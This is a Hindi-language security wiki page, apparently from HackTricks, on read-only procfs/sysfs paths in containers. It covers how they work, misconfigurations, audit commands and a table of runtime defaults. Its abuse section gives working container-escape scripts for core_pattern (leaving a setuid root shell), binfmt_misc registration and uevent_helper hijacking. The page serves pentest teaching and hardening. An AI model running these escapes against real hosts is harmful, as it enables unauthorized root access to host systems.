# रीड-ओनली सिस्टम पाथ्स

{{#include ../../../../banners/hacktricks-training.md}}

रीड-ओनली सिस्टम पाथ्स masked paths से अलग एक सुरक्षा उपाय हैं। Path को पूरी तरह छिपाने के बजाय, runtime उसे दिखाता है लेकिन उसे read-only के रूप में mount करता है। यह आमतौर पर चुने हुए procfs और sysfs लोकेशन्स के लिए किया जाता है जहाँ read access स्वीकार्य या संचालन के लिए आवश्यक हो सकता है, पर writes बहुत जोखिम भरे होंगे।

उद्देश्य सीधा है: कई kernel interfaces writable होने पर बहुत अधिक खतरनाक हो जाते हैं। एक read-only mount सभी reconnaissance value को मिटाता नहीं है, पर यह compromised workload को उस path के माध्यम से underlying kernel-facing files को modify करने से रोकता है।

## संचालन

Runtimes अक्सर proc/sys view के हिस्सों को read-only के रूप में मार्क करते हैं। runtime और host पर निर्भर करते हुए, इसमें निम्नलिखित paths शामिल हो सकते हैं:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

असली सूची बदलती रहती है, पर मॉडल एक सा है: जहाँ जरूरत हो visibility की अनुमति दें, और mutation को डिफ़ॉल्ट रूप से अस्वीकार करें।

## लैब

Docker-declared read-only path सूची की जाँच करें:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
container के अंदर से mounted proc/sys view की जाँच करें:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## सुरक्षा प्रभाव

केवल-पढ़ने योग्य सिस्टम पथ होस्ट-पर प्रभाव डालने वाले दुरुपयोग की एक बड़ी श्रेणी को सीमित कर देते हैं। भले ही कोई हमलावर procfs या sysfs का निरीक्षण कर सके, वहाँ लिखने में असमर्थ होने से kernel tunables, crash handlers, module-loading helpers, या अन्य नियंत्रण इंटरफेस से जुड़ी कई प्रत्यक्ष संशोधन पथ हट जाते हैं। экспोज़र पूरी तरह चला नहीं जाता, लेकिन सूचना-प्रकटीकरण से होस्ट पर प्रभाव डालने तक का ट्रांज़िशन कठिन हो जाता है।

## गलत कॉन्फ़िगरेशन

मुख्य गलतियाँ संवेदनशील पथों का unmask करना या उन्हें read-write के रूप में remount करना, writable bind mounts के जरिए host proc/sys कंटेंट को सीधे उजागर करना, या ऐसे privileged मोड का उपयोग करना हैं जो सुरक्षित runtime डिफॉल्ट्स को प्रभावी रूप से बायपास कर देते हैं। Kubernetes में, `procMount: Unmasked` और privileged workloads अक्सर कमजोर proc सुरक्षा के साथ-साथ चलते हैं। एक और सामान्य ऑपरेशनल गलती यह मान लेना है कि क्योंकि runtime आमतौर पर इन पथों को read-only के रूप में माउंट करता है, सभी workloads अभी भी उस डिफ़ॉल्ट को विरासत में पा रहे हैं।

## दुरुपयोग

यदि सुरक्षा कमजोर है, तो लिखने योग्य proc/sys एंट्रियों की तलाश से शुरू करें:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
जब writable प्रविष्टियाँ मौजूद हों, उच्च-मूल्य वाले अनुवर्ती पथ शामिल हैं:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- `/proc/sys` के लिखने योग्य एंट्रीज़ अक्सर संकेत देते हैं कि container केवल निरीक्षण करने के बजाय host kernel के व्यवहार को बदल सकता है।
- `core_pattern` विशेष रूप से महत्वपूर्ण है क्योंकि एक writable host-facing value को pipe handler सेट करने के बाद किसी process को crash करके host code-execution path में बदला जा सकता है।
- `modprobe` उस helper को प्रकट करता है जिसे kernel module-loading संबंधित flows के लिए उपयोग करता है; लिखने योग्य होने पर यह एक क्लासिक high-value target होता है।
- `binfmt_misc` बताता है कि custom interpreter registration संभव है या नहीं। अगर registration लिखने योग्य है, तो यह केवल information leak नहीं बल्कि execution primitive बन सकता है।
- `panic_on_oom` एक host-wide kernel निर्णय को नियंत्रित करता है और इसलिए resource exhaustion को host denial of service में बदल सकता है।
- `uevent_helper` writable sysfs helper path के सबसे स्पष्ट उदाहरणों में से एक है जो host-context execution पैदा कर सकता है।

रोचक खोजों में उन writable host-facing proc knobs या sysfs entries का शामिल होना है जिन्हें सामान्यतः read-only होना चाहिए था। उस बिंदु पर, workload constrained container view से हटकर meaningful kernel influence की ओर बढ़ चुका होता है।

### Full Example: `core_pattern` Host Escape

यदि `/proc/sys/kernel/core_pattern` container के अंदर से writable है और host kernel view की ओर इशारा करता है, तो इसे crash के बाद payload execute करने के लिए गलत इस्तेमाल किया जा सकता है:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
यदि पथ वास्तव में होस्ट कर्नेल तक पहुँचता है, तो payload होस्ट पर चलता है और पीछे एक setuid shell छोड़ देता है।

### पूरा उदाहरण: `binfmt_misc` पंजीकरण

यदि `/proc/sys/fs/binfmt_misc/register` लिखने योग्य है, तो एक custom interpreter registration उस matching file के निष्पादन पर code execution उत्पन्न कर सकता है:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
एक host-facing writable `binfmt_misc` पर, परिणाम kernel-triggered interpreter path में कोड निष्पादन होता है।

### पूर्ण उदाहरण: `uevent_helper`

यदि `/sys/kernel/uevent_helper` writable है, तो kernel किसी matching event के trigger होने पर host-path helper को invoke कर सकता है:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
यह इतना खतरनाक इसलिए है क्योंकि सहायक पथ होस्ट फ़ाइल सिस्टम के दृष्टिकोण से सुलझाया जाता है, न कि एक सुरक्षित केवल-कंटेनर संदर्भ से।

## Checks

ये जाँचें निर्धारित करती हैं कि procfs/sysfs का एक्सपोज़र अपेक्षित स्थानों पर रीड-ओनली है या नहीं और क्या वर्कलोड अभी भी संवेदनशील कर्नेल इंटरफेसों को संशोधित कर सकता है।
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- एक normal hardened workload को बहुत कम writable /proc/sys entries को expose करना चाहिए।
- Writable `/proc/sys` paths अक्सर ordinary read access से अधिक महत्वपूर्ण होते हैं।
- यदि runtime कहता है कि कोई path read-only है लेकिन व्यवहार में वह writable है, तो mount propagation, bind mounts, और privilege settings को ध्यान से review करें।

## Runtime Defaults

| Runtime / प्लेटफ़ॉर्म | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | सामान्य मैन्युअल कमजोरियाँ |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से सक्षम | Docker संवेदनशील proc एंट्रियों के लिए एक डिफ़ॉल्ट read-only path सूची परिभाषित करता है | host proc/sys mounts को एक्सपोज़ करना, `--privileged` |
| Podman | डिफ़ॉल्ट रूप से सक्षम | Podman डिफ़ॉल्ट read-only paths लागू करता है जब तक कि इन्हें स्पष्ट रूप से शिथिल न किया जाए | `--security-opt unmask=ALL`, व्यापक host mounts, `--privileged` |
| Kubernetes | रनटाइम डिफ़ॉल्ट्स को अपनाता है | नीचे के runtime के read-only path मॉडल का उपयोग करता है जब तक कि Pod सेटिंग्स या host mounts द्वारा कमजोर न किया गया हो | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | रनटाइम डिफ़ॉल्ट | आम तौर पर OCI/runtime डिफ़ॉल्ट्स पर निर्भर करता है | Kubernetes पंक्ति के समान; सीधे runtime config परिवर्तन व्यवहार को कमजोर कर सकते हैं |

The key point is that read-only system paths are usually present as a runtime default, but they are easy to undermine with privileged modes or host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
